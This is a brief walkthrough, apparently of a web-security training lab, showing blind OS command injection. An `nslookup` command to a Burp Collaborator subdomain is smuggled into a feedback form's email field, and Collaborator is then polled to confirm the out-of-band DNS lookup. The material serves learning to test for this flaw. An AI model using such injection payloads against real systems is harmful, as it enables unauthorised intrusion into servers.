Intercept the request using `BurpSuite` and then `Modify` the request that submits feedback:

Open `Burp Collaborator Client` and copy the subdomain. I this case : `u0vaih5wnq6mdj00bv3gjzudx43urj.burpcollaborator.net`

Modify the email address changing it to:
```
b||nslookup+u0vaih5wnq6mdj00bv3gjzudx43urj.burpcollaborator.net||
```

Send it.

Now go to Burp Collaborator, and press 'Poll now' to confirm that a DNS lookup occurred.
